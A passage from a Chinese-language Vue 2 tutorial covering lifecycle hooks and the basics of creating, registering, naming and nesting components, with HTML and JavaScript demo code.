5.3 自定义事件注意点 5.4 TodoList使用自定义事件 5.5 全局事件总线 5.6 TodoList使用全局事件总线 5.7 给TodoList追加编辑功能 六、Vue中的动画与过渡 6.1 动画 6.2 过渡 6.3 多元素动画/过渡 6.4 集成第三方动画库 七、内容分发——插槽 7.1 默认插槽 7.2 具名插槽 7.3 作用域插槽",content:'# Vue进阶\n\n\n# 一、Vue实例生命周期\n\n\n# 1.1 这个定时器要放哪\n\n我们经常使用定时器来控制页面展示效果，那么这个定时器应该放到哪里呢？我们可以看下面这个例子。\n\n<!DOCTYPE html>\n<html lang="en">\n<head>\n    <meta charset="UTF-8">\n    <title>Document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        <h2 :style="{opacity}">你好，{{name}}</h2>\n    </div>\n    <script type="text/javascript">\n        Vue.config.productionTip = false;\n        const vm = new Vue({\n            el: \'#root\',\n            data: { name: \'张三\', opacity: 1 },\n        });\n        setInterval(() => {\n            vm.opacity -= 0.1\n            if (vm.opacity <= 0) vm.opacity = 1;\n        }, 100);\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n上面例子里的定时器放在了vm实例创建完之后，这会有什么问题呢？定时器与vm实例在代码层面是割裂开的，但是功能是有联系的，这符合一般的开发规范。那我们得考虑将定时器放到vm实例里，那放在methods里吗？methods里的方法一般是充当事件回调函数的，如果你非要新建一个方法包裹setInterval定时器，那还得对应在模板里主动调用这个新方法，代码如下，运行效果不符合预期。\n\n<!DOCTYPE html>\n<html lang="en">\n<head>\n    <meta charset="UTF-8">\n    <title>Document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        <h2 :style="{opacity}">你好，{{name}}</h2>\n        <h2>{{change()}}</h2>\n    </div>\n    <script type="text/javascript">\n        Vue.config.productionTip = false;\n        const vm = new Vue({\n            el: \'#root\',\n            data: {\n                name: \'张三\',\n                opacity: 1\n            },\n            methods: {\n                change() {\n                    setInterval(() => {\n                        console.log(\'定时器\');\n                        this.opacity -= 0.1\n                        if (this.opacity <= 0) this.opacity = 1;\n                    }, 100);\n                }\n            },\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\n上面例子的运行效果不符合预期，这是因为定时器里做了data存储数据的修改（vm.opacity = xxx），会导致模板一直重新解析，那就一直会调用change。\n\n我们的期望是只让change始终值只调用一次，在真实DOM第一次被放到页面时调用它，在之后的模板重新解析时不再调用它，那这就不得不用到Vue的声明周期函数。mounted就是Vue生命周期函数中的一个，在Vue完成模板解析并真实DOM元素放入页面后回调mounted，也就说mounted只在挂载后调用一次，在后面每次更新都不会再被调用了。\n\n<!DOCTYPE html>\n<html lang="en">\n<head>\n    <meta charset="UTF-8">\n    <title>Document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        <h2 :style="{opacity}">你好，{{name}}</h2>\n    </div>\n    <script type="text/javascript">\n        Vue.config.productionTip = false;\n        const vm = new Vue({\n            el: \'#root\',\n            data: {\n                name: \'张三\',\n                opacity: 1\n            },\n            // mounted生命周期函数，在Vue完成模板解析并真实DOM元素放入页面后被调用（挂载后）\n            mounted() {\n                setInterval(() => {\n                    console.log(\'定时器\');\n                    this.opacity -= 0.1\n                    if (this.opacity <= 0) this.opacity = 1;\n                }, 100);\n            },\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n----------------------------------------\n\n总结拓展：\n\n 1. 生命周期函数：Vue在关键时刻帮我们调用的一些特殊名称的函数。\n 2. 生命周期函数又名生命周期回调函数或生命周期钩子。\n 3. 生命周期函数的方法名是固定的不可更改的，方法体内容根据开发需求自行修改。\n 4. 生命周期函数中的this指向是vm或组件实例对象。\n\n----------------------------------------\n\n\n# 1.2 挂载流程\n\n\n\n挂载流程：\n\n 1. Init Events & Lifecycle阶段：规定Vue的生命周期函数有多少个、在什么时候调用，还规定了事件与事件修饰符的怎么运行。该阶段还未进行数据处理。该阶段紧跟其后的一个生命周期函数是beforeCreate()，该生命周期函数中还无法通过vm访问到data中的数据、methods中的方法。\n    \n    <!DOCTYPE html>\n    <html lang="en">\n    <head>\n        <meta charset="UTF-8">\n        <title>Document</title>\n        <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n    </head>\n    <body>\n        <div id="root">\n            <h2>你好，{{name}}</h2>\n            <button @click="change">点击我</button>\n        </div>\n        <script type="text/javascript">\n            Vue.config.productionTip = false;\n            const vm = new Vue({\n                el: \'#root\',\n                data: {\n                    name: \'张三\'\n                },\n                // beforeCreate生命钩子：无法通过vm访问到data中的数据、methods中的方法。\n                beforeCreate() {\n                    console.log(\'尝试访问data数据\', this.name, this._data);\n                    console.log(\'尝试访问methods方法\', this.add);\n                    debugger;\n                },\n                methods: {\n                    change() { this.name = \'李四\'; }\n                },\n            });\n        <\/script>\n    </body>\n    </html>\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    27\n    28\n    29\n    30\n    31\n    32\n    \n\n 2. Init injections & reactivity阶段：处理了依赖注入等，并对存储数据做了数据监视和数据代理。该阶段紧跟其后的一个生命周期函数是created()，该生命周期函数中可以通过vm访问到data中的数据、methods中的方法。\n    \n    <!DOCTYPE html>\n    <html lang="en">\n    <head>\n        <meta charset="UTF-8">\n        <title>Document</title>\n        <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n    </head>\n    <body>\n        <div id="root">\n            <h2>你好，{{name}}</h2>\n            <button @click="change">点击我</button>\n        </div>\n        <script type="text/javascript">\n            Vue.config.productionTip = false;\n            const vm = new Vue({\n                el: \'#root\',\n                data: {\n                    name: \'张三\'\n                },\n                // created生命钩子：可以通过vm访问到data中的数据、methods中的方法。\n                created() {\n                    console.log(\'尝试访问data数据\', this.name, this._data);\n                    console.log(\'尝试访问methods方法\', this.add);\n                    debugger;\n                },\n                methods: {\n                    change() { this.name = \'李四\'; }\n                },\n            });\n        <\/script>\n    </body>\n    </html>\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    27\n    28\n    29\n    30\n    31\n    32\n    \n\n 3. 模板解析阶段：开始解析模板生成虚拟DOM存储在内存中，还未生成对应的真实DOM。该阶段紧跟其后的一个生命周期函数是beforeMount()，在此生命钩子中对应页面的展示还是模板内容，虽然虚拟DOM生成了，但真实DOM还未加到页面中，所以不要在此生命钩子中操作真实DOM。\n    \n\n 4. Create vm.$el and replace "el" with it阶段：将虚拟DOM转换成真实DOM，并将真实DOM存储在vm.$el，然后将真实DOM插入了页面。该阶段紧跟其后的一个生命周期函数是mounted()，在此生命钩子中对应页面的展示已经是真实DOM了，可以进行真实DOM操作（不建议），也可以开启定时器、发送网络请求、订阅消息、绑定自定义事件等初始化操作。\n    \n\n\n# 1.3 更新流程\n\n\n\n更新流程比较简单，当data存储数据改变时就去更新页面。Virtual DOM re-renderand patch阶段：生成新的虚拟DOM，再与旧的虚拟DOM进行比较，根据比较结果更新页面。该阶段前有个生命周期函数是beforeUpdate()，data存储数据是新的，但页面还是旧的。该阶段后有个生命周期函数是updated()，data存储数据是新的，页面也是新的。\n\n<!DOCTYPE html>\n<html lang="en">\n<head>\n    <meta charset="UTF-8">\n    <title>Document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        <h2>你好，{{name}}</h2>\n        <button @click="change">点击我</button>\n    </div>\n    <script type="text/javascript">\n        Vue.config.productionTip = false;\n        const vm = new Vue({\n            el: \'#root\',\n            data: {\n                name: \'张三\'\n            },\n            // beforeUpdate生命钩子：数据是新的，但页面是旧的，即页面尚未和数据保持同步。\n            beforeUpdate() {\n                console.log(\'data数据是新的：\', this.name);\n                console.log(\'页面是旧的\', document.getElementsByTagName(\'h2\')[0].innerText);\n                debugger;\n            },\n            // updated生命钩子：数据是新的，页面也是新的，即页面和数据保持同步。\n            updated() {\n                console.log(\'data数据是新的：\', this.name);\n                console.log(\'页面也是新的\', document.getElementsByTagName(\'h2\')[0].innerText);\n                debugger;\n            },\n            methods: {\n                change() {\n                    this.name = \'李四\';\n                }\n            },\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n\n\n\n# 1.4 销毁流程\n\n\n\n销毁流程比较简单，当vm被销毁时（调用vm.$destroy()）就执行销毁操作。Teardown watchers, child components and event listeners阶段，移除数据监听、子组件和事件监听器（不影响原生事件），但是页面的DOM显示还是正常的。该阶段前有个生命周期函数是beforeDestroy()，此时还能使用vm中所有的data、methods、指令等（但改动data存储数据是不会触发更新，因为要销毁了），但主要是为了进行关闭定时器、取消订阅消息、解绑自定义事件等收尾操作。该阶段后有个生命周期函数是destroyed()，几乎不在该生命周期函数里处理事情。\n\n<!DOCTYPE html>\n<html lang="en">\n<head>\n    <meta charset="UTF-8">\n    <title>Document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        <h2>你好，{{name}}</h2>\n        <h2>数值，{{num}}</h2>\n        <button @click="change">点击我，改变name，并销毁vm</button>\n    </div>\n    <script type="text/javascript">\n        Vue.config.productionTip = false;\n        const vm = new Vue({\n            el: \'#root\',\n            data: {\n                name: \'张三\',\n                num: 1\n            },\n            // beforeDestroy生命钩子：vm中所有的data、methods、指令等，都处于可用状态，马上要执行销毁过程，\n            // 一般在此阶段：关闭定时器、取消订阅消息、解绑自定义事件等收尾操作。\n            beforeDestroy() {\n                console.log(\'尝试访问data数据\', this.name, this._data);\n                console.log(\'尝试访问methods方法\', this.add);\n                this.num = this.num + 1;\n                console.log(\'让num+1：\', this.num, \'再观察页面是否更新\');\n                debugger;\n            },\n            // destroyed生命钩子：几乎不在该生命周期函数里处理事情\n            destroyed() { },\n            methods: {\n                change() {\n                    this.name = \'李四\';\n                    // 销毁vm\n                    // this.$destroy();\n                }\n            },\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n\n\n注意：最好不要使用vm.$destroy()，最好使用v-if\n\n\n# 1.5 整个生命周期图示\n\n总共有4对生命周期函数：\n\n * beforeCreate()和created()，数据处理前后\n * beforeMount()和mounted()，真实DOM插入页面前后\n * beforeUpdate()和updated()，虚拟和真实DOM更新前后\n * beforeDestroy()和destroyed()，vm或组件实例销毁前后\n\n\n\n----------------------------------------\n\n总结拓展：\n\n 1. 常用的生命周期钩子：\n    1. mounted()：发送ajax请求、启动定时器、绑定自定义事件、订阅消息等初始化操作。\n    2. beforeDestroyed()：清除定时器、解绑自定义事件、取消订阅消息等收尾操作。\n 2. 关于销毁Vue实例：\n    1. 销毁后借助Vue开发者工具看不到任何信息。\n    2. 销毁后自定义事件会失效，但原生DOM事件依然有效。\n    3. 一般不会在beforeDestroyed()里操作数据，即使操作了数据，也不会触发重新渲染。\n\n----------------------------------------\n\n\n# 二、Vue组件化编程\n\n\n# 2.1 什么是组件化编程\n\n用传统方式来开发web项目，会出现多个html、多个js、多个css文件，它们之间的关系会很混乱，维护起来非常不方便。一旦出现功能和展示几乎相同的部分，就会难以复用。当然，随着前端技术的进步可以解决一部分问题，js可以使用es6模块（拆分js，以模块形式导入导出），css也能使用css in js等技术（以模块导入）。\n\n\n\n现代前端技术，UI框架基本推荐使用组件化编程的方式。首先，“组件”的定义是，实现应用中局部功能代码和资源的集合。\n\n那么组件化编程是什么意思呢？是将页面拆分成一个个组件，单个组件会封装所需要的代码和资源（局部功能）。虽然组件是一个独立的个体，但是多个组件是可以进行互相交流的，将开发好了的组件组合在一起，形成一个功能完善的页面（完整功能），这就是组件化编程。当然，组件的高度封装具有独立性，是可以被拿到其他地方进行复用的。\n\n\n\n\n# 2.2 如何运用组件\n\n在这几节里为了代码演示，暂时使用非单文件组件，至于单文件组件在实际开发中使用的更多，会在后面讲解。非单文件组件的意思是一个文件包含了多个组件，那单文件组件自然就是一个文件只包含了一个组件。\n\n在开发中到底怎么运用组件呢？分为三步：1. 创建组件；2. 注册组件；3. 使用组件。\n\n * 创建组件：\n   \n   1. 使用Vue.extend(xxx)进行创建组件，其中xxx是一个配置对象，该配置对象和Vue实例化时传入的配置对象几乎是相同的（比如配置对象中的el只在Vue实例化时才能用）。\n   \n   2. 组件的配置对象的data，一定得使用函数形式。假设组件A会在组件B和组件C里被调用（被复用），组件B去修改了A的data数据，因为data是对象的缘故，在组件C中看到自己调用的A的data数据也变了，这就导致各个调用处共用了一套数据。那就需要使用data的函数形式，data函数return一个新对象，组件B使用A的data数据是独一份的，组件C使用A的data数据也是独一份的。\n      \n      // data返回一个对象，各自调用处用的data数据就不会是同一个对象了\n      function data() {\n          return {a:1,b:2}\n      }\n      const x1 = data();\n      const x2 = data();\n      x1.a = 3; // 影响不到x2的a\n      console.log(\'x2.a:\', x2.a);\n      \n      \n      1\n      2\n      3\n      4\n      5\n      6\n      7\n      8\n      \n   \n   3. 可以将组件的模板写在组件的配置对象里，使用的是template，它与data平级，template的值是一个字符串。\n      \n      Vue.config.productionTip = false;\n      const school = Vue.extend({\n          template: `\n              <div>\n                  <h2>学校：{{schoolName}}</h2>\n                  <h2>地址：{{schoolAddress}}</h2>\n              </div>`,\n          data() {\n              return { schoolName: \'武汉大学\', schoolAddress: \'武汉市武昌区珞珈山路\' }\n          }\n      });\n      const person = Vue.extend({\n          template: `\n              <div>\n                  <h2>姓名：{{name}}</h2>\n                  <h2>年龄：{{age}}</h2>\n              </div>`,\n          data() {\n              return { name: \'张三\', age: 18 }\n          }\n      });\n      \n      \n      1\n      2\n      3\n      4\n      5\n      6\n      7\n      8\n      9\n      10\n      11\n      12\n      13\n      14\n      15\n      16\n      17\n      18\n      19\n      20\n      21\n      \n\n * 注册组件：\n   \n   1. 要在调用处注册你将要使用的组件。需要在调用处的配置对象中使用一个新的配置components，components与methods平级。组件注册在components对象里，属性名也就是组件名（自己取的，将来会在模板里使用），属性值就是组件引用（组件创建后留下的组件引用）。\n      \n      Vue.config.productionTip = false;\n      const school = Vue.extend({\n          template: `\n              <div>\n                  <h2>学校：{{schoolName}}</h2>\n                  <h2>地址：{{schoolAddress}}</h2>\n              </div>`,\n          data() {\n              return { schoolName: \'武汉大学\', schoolAddress: \'武汉市武昌区珞珈山路\' }\n          }\n      });\n      const person = Vue.extend({\n          template: `\n              <div>\n                  <h2>姓名：{{name}}</h2>\n                  <h2>年龄：{{age}}</h2>\n              </div>`,\n          data() {\n              return { name: \'张三\', age: 18 }\n          }\n      });\n      const vm = new Vue({\n          el: \'#root\',\n          // 局部注册组件（在调用处的配置对象的components里），属性名和组件引用的名相同，就用简写\n          components: {\n              school,\n              person\n          }\n      });\n      \n      \n      1\n      2\n      3\n      4\n      5\n      6\n      7\n      8\n      9\n      10\n      11\n      12\n      13\n      14\n      15\n      16\n      17\n      18\n      19\n      20\n      21\n      22\n      23\n      24\n      25\n      26\n      27\n      28\n      29\n      \n   \n   2. 上一点是局部注册，还有一个全局注册，使用得是Vue.component(\'xxx\', xxx)，第一个参数是组件名（自己取的，将来会在调用处的模板里使用），第二个参数是组件引用（组件创建后留下的组件引用）。\n      \n      Vue.config.productionTip = false;\n      const school = Vue.extend({\n          template: `\n              <div>\n                  <h2>学校：{{schoolName}}</h2>\n                  <h2>地址：{{schoolAddress}}</h2>\n              </div>`,\n          data() {\n              return { schoolName: \'武汉大学\', schoolAddress: \'武汉市武昌区珞珈山路\' }\n          }\n      });\n      const person = Vue.extend({\n          template: `\n              <div>\n                  <h2>姓名：{{name}}</h2>\n                  <h2>年龄：{{age}}</h2>\n              </div>`,\n          data() {\n              return { name: \'张三\', age: 18 }\n          }\n      });\n      // 全局注册组件，school和person能被所有组件使用，这种情况用的少\n      Vue.component(\'school\', school);\n      Vue.component(\'person\', person);\n      const vm = new Vue({\n          el: \'#root\'\n      });\n      \n      \n      1\n      2\n      3\n      4\n      5\n      6\n      7\n      8\n      9\n      10\n      11\n      12\n      13\n      14\n      15\n      16\n      17\n      18\n      19\n      20\n      21\n      22\n      23\n      24\n      25\n      26\n      27\n      \n\n * 使用组件：在模板中使用组件的时候，先找到组件在配置对象中components里对应的属性名，再将这个属性名使用<>包裹成标签就可以到模板里使用了。\n   \n   <!DOCTYPE html>\n   <html lang="en">\n   <head>\n       <meta charset="UTF-8">\n       <title>Document</title>\n       <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n   </head>\n   <body>\n       <div id="root">\n           \x3c!-- 使用组件，编写组件标签 --\x3e\n           <school></school>\n           <hr>\n           <person></person>\n       </div>\n       <script type="text/javascript">\n           Vue.config.productionTip = false;\n           // 创建组件\n           const school = Vue.extend({\n               template: `\n                   <div>\n                       <h2>学校：{{schoolName}}</h2>\n                       <h2>地址：{{schoolAddress}}</h2>\n                   </div>`,\n               data() {\n                   return { schoolName: \'武汉大学\', schoolAddress: \'武汉市武昌区珞珈山路\' }\n               }\n           });\n           const person = Vue.extend({\n               template: `\n                   <div>\n                       <h2>姓名：{{name}}</h2>\n                       <h2>年龄：{{age}}</h2>\n                   </div>`,\n               data() {\n                   return { name: \'张三\', age: 18 }\n               }\n           });\n           const vm = new Vue({\n               el: \'#root\',\n               // 注册组件\n               components: {\n                   school,\n                   person\n               }\n           });\n       <\/script>\n   </body>\n   </html>\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   11\n   12\n   13\n   14\n   15\n   16\n   17\n   18\n   19\n   20\n   21\n   22\n   23\n   24\n   25\n   26\n   27\n   28\n   29\n   30\n   31\n   32\n   33\n   34\n   35\n   36\n   37\n   38\n   39\n   40\n   41\n   42\n   43\n   44\n   45\n   46\n   47\n   48\n   \n\n----------------------------------------\n\n总结拓展：\n\n 1. Vue中使用组件的三大步骤：\n    1. 定义组件（创建组件）\n    2. 注册组件\n    3. 使用组件（编写组件标签）\n 2. 如何定义一个组件：\n    1. 使用Vue.extend(options)创建（注意extend没有带s），其中options和new Vue(options)时传入的那个options几乎一样，但也有区别：\n       * el不要写，为什么？——最终所有的组件都要经过Vue的管理，由vm中的el决定服务于哪个容器。\n       * data必须写成函数，为什么？——避免组件被复用时，数据存在引用关系（被共用了）。\n    2. 备注：使用template可以配置组件结构（模板）。\n 3. 如何注册组件：\n    1. 局部注册：new Vue(options)时，options的components配置。\n    2. 全局注册：Vue.component(\'组件名\', 组件)，注意component没有带s。\n 4. 编写组件标签：<school></school>\n\n----------------------------------------\n\n\n# 2.3 组件的几个注意点\n\n在上面一小节里的注册组件里，components的属性名也就是组件名，这个是“自己取的”。这个组件名将来会被用到模板里去使用，它有两种命名情况：\n\n * 一个单词组成：1) 可以字母全部小写，例如school；2) 可以只有首字母大写，例如School。\n * 多个单词组成：2) 使用短横线-连接，例如my-school；2) 让每个单词的首字母大写，例如MySchool。在一般的html页面，MySchool其实会出现问题，但是在Vue脚手架里却是正常的。\n\n<!DOCTYPE html>\n<html lang="en">\n<head>\n    <meta charset="UTF-8">\n    <title>Document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        \x3c!-- 使用组件，编写组件标签 --\x3e\n        <my-school></my-school>\n        <hr>\n        <person></person>\n    </div>\n    <script type="text/javascript">\n        Vue.config.productionTip = false;\n        // 创建组件\n        const sch = Vue.extend({\n            template: `\n                    <div>\n                        <h2>学校：{{schoolName}}</h2>\n                        <h2>地址：{{schoolAddress}}</h2>\n                    </div>`,\n            data() {\n                return { schoolName: \'武汉大学\', schoolAddress: \'武汉市武昌区珞珈山路\' }\n            }\n        });\n        const person = Vue.extend({\n            template: `\n                    <div>\n                        <h2>姓名：{{name}}</h2>\n                        <h2>年龄：{{age}}</h2>\n                    </div>`,\n            data() {\n                return { name: \'张三\', age: 18 }\n            }\n        });\n        const vm = new Vue({\n            el: \'#root\',\n            // 注册组件\n            components: {\n                // 属性名，是多个单词，那用短横线连接`my-school`；也可每个单词首字母大写`MySchool`，但只能出现在脚手架里\n                \'my-school\': sch, // sch是创建组件后留下的组件引用名，`my-school`是注册时的组件名，注意区分两者\n                // 属性名，是单个单词，可以全部小写`person`，也可以只有首字母大写`Person`\n                Person: person\n            }\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n\n\n在模板里使用组件，可以是<person></person>也可以是<person/>。第二种的<person/>在非脚手架环境中会出现渲染问题，它后面的组件不会被渲染。\n\n<!DOCTYPE html>\n<html lang="en">\n<head>\n    <meta charset="UTF-8">\n    <title>Document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        \x3c!-- 使用组件，在非脚手架环境中，只渲染了第一个person组件 --\x3e\n        <school />\n        <school />\n        <school />\n    </div>\n    <script type="text/javascript">\n        Vue.config.productionTip = false;\n        // 创建组件\n        const school = Vue.extend({\n            template: `\n                <div>\n                    <h2>学校：{{schoolName}}</h2>\n                    <h2>地址：{{schoolAddress}}</h2>\n                </div>`,\n            data() {\n                return { schoolName: \'武汉大学\', schoolAddress: \'武汉市武昌区珞珈山路\' }\n            }\n        });\n        const vm = new Vue({\n            el: \'#root\',\n            // 注册组件\n            components: { school }\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n\n\n创建组件时，可以将Vue.extend省略，直接将options赋给引用。表面省略了实际底层还是调用了Vue.extend。\n\n<!DOCTYPE html>\n<html lang="en">\n<head>\n    <meta charset="UTF-8">\n    <title>Document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        \x3c!-- 使用组件 --\x3e\n        <school></school>\n    </div>\n    <script type="text/javascript">\n        Vue.config.productionTip = false;\n        // 创建组件，省略了Vue.extend()，实际底层调用了Vue.extend()\n        const school = {\n            template: `\n                <div>\n                    <h2>学校：{{schoolName}}</h2>\n                    <h2>地址：{{schoolAddress}}</h2>\n                </div>`,\n            data() {\n                return { schoolName: \'武汉大学\', schoolAddress: \'武汉市武昌区珞珈山路\' }\n            }\n        };\n        const vm = new Vue({\n            el: \'#root\',\n            // 注册组件\n            components: { school }\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\n----------------------------------------\n\n总结拓展：\n\n 1. 关于组件名：\n    1. 一个单词组成：1) 字母全小写；2) 只首字母大写。\n    2. 多个单词组成：1) 使用短横线分隔； 2) 每个单词首字母大写（需要脚手架支持）。\n    3. 备注：1) 尽可能避开html中已有的标签名；2) 可以使用name配置指定组件在开发者工具中呈现的名字。\n 2. 关于组件标签：\n    1. 可以是<school></school>。\n    2. 可以是<school/>，在不使用脚手架时，<school/>会导致后续组件不能渲染。\n 3. 一个简写方式：const school = Vue.extend(options)可简写为const school = options\n\n----------------------------------------\n\n\n# 2.4 组件的嵌套\n\n在第一小节里说过可以将页面拆分成一个个组件，其实组件也能被拆分成一个个组件。这就涉及到组件的嵌套了，很简单，只需要在组件里注册另外一个组件，然后在模板中使用注册好的那个组件，这样就完成了一个简单的组件嵌套。\n\n<!DOCTYPE html>\n<html lang="en">\n<head>\n    <meta charset="UTF-8">\n    <title>Document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        \x3c!-- 使用school组件 --\x3e\n        <school></school>\n    </div>\n    <script type="text/javascript">\n        Vue.config.productionTip = false;\n        // 创建student组件\n        const student = Vue.extend({\n            template: `\n                <div>\n                    <h2>学生姓名：{{name}}</h2>\n                    <h2>学生年龄：{{age}}</h2>\n                </div>`,\n            data() {\n                return { name: \'张三\', age: 18 }\n            }\n        });\n        // 创建school组件\n        const school = Vue.extend({\n            template: `\n                <div>\n                    <h2>学校：{{schoolName}}</h2>\n                    <h2>地址：{{schoolAddress}}</h2>\n                    \x3c!-- 使用school组件，注册在哪个组件里，就使用在哪个组件的模板中 --\x3e\n                    <student></student>\n                </div>`,\n            data() {\n                return { schoolName: \'武汉大学\', schoolAddress: \'武汉市武昌区珞珈山路\' }\n            },\n            // 在组件中注册另一个组件，完成组件嵌套\n            components: { student }\n        });\n        const vm = new Vue({\n            el: \'#root\',\n            // 注册school组件\n            components: { school }\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n\n\n\n\n\n# 2.5 VueComponent\n\n创建组件其本质是生成了一个函数对象，这个函数是一个VueComponent构造函数（等待实例化），我们看一下Vue.extend的简化源码。\n\nVue.extend = function (extendOptions) {\n    // ... 其他逻辑暂时省略\n    var Sub = function VueComponent(options) {\n        this._init(options);\n    };\n    // ... 其他逻辑暂时省略\n    // 生成VueComponent构造函数并返回\n    return Sub\n};\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n创建了多个组件，那每个组件拥有的VueComponent构造函数是不相同的（上面return的是新对象），虽然VueComponent实际代码一样，但是它们的执行环境、变量对象、this都是不一样的。你可以简单测试一下。\n\n<!DOCTYPE html>\n<html lang="en">\n<head>\n    <meta charset="UTF-8">\n    <title>Document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        \x3c!-- 使用组件 --\x3e\n        <school></school>\n        <student></student>\n    </div>\n    <script type="text/javascript">\n        Vue.config.productionTip = false;\n        // 创建student组件\n        const student = Vue.extend({\n            template: `\n                <div>\n                    <h2>学生姓名：{{name}}</h2>\n                    <h2>学生年龄：{{age}}</h2>\n                </div>`,\n            data() {\n                return { name: \'张三\', age: 18 }\n            }\n        });\n        // 创建school组件\n        const school = Vue.extend({\n            template: `\n                <div>\n                    <h2>学校：{{schoolName}}</h2>\n                    <h2>地址：{{schoolAddress}}</h2>\n                </div>`,\n            data() {\n                return { schoolName: \'武汉大学\', schoolAddress: \'武汉市武昌区珞珈山路\' }\n            },\n        });\n        // 首先验证school和student是个什么东西？其实是个VueComponent构造函数\n        console.log(\'school是什么？\', school);\n        console.log(\'student是什么？\', student);\n        // 再验证不同组件的VueComponent构造函数是否一样，其实不一样，每次Vue.extend都会生成新的\n        console.log(\'student是否与school相同？\', school === student);\n        school.a = 11;\n        console.log(\'school.a是11，那student.a是多少？\', student.a);\n        const vm = new Vue({\n            el: \'#root\',\n            // 注册组件\n            components: { school, student }\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n\n\n在模板中使用组件，其底层是使用new关键字调用VueComponent构造函数，将它实例化，生成的实例就是组件实例，通常简称为vc。vc与vm的结构非常类似，因为VueComponent构造函数和Vue构造函数都会走this._init(options)逻辑，区别就是各自的options有些不一样，也就是前面说过el和data有些不一样。options里的这些配置methods、watch、computed，在这些配置里面定义方法，方法的this指向就是生成的实例，组件就是组件实例vc。\n\n// 组件实例化时调用\nvar Sub = function VueComponent(options) {\n    this._init(options);\n};\n// new Vue()时调用\nfunction Vue(options) {\n    